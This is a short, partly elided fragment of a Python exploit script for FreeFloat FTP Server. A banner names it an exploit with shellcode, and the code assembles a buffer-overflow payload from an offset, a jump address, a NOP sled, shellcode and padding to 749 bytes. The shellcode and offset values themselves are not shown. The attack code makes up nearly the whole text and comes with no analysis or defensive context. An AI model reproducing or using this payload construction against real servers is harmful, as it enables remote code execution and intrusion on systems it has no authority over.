...
banner = """
#----------------------------------------------#
FreeFloat FTP Server Exploit with Shellcode
1. python freefloat_ftp_server_sc.py
...
bufferandshellcode = "\x90"*20 + shellcode

sploit =  offset + nowjump + bufferandshellcode + 'C'*(749-len(bufferandshellcode)) 
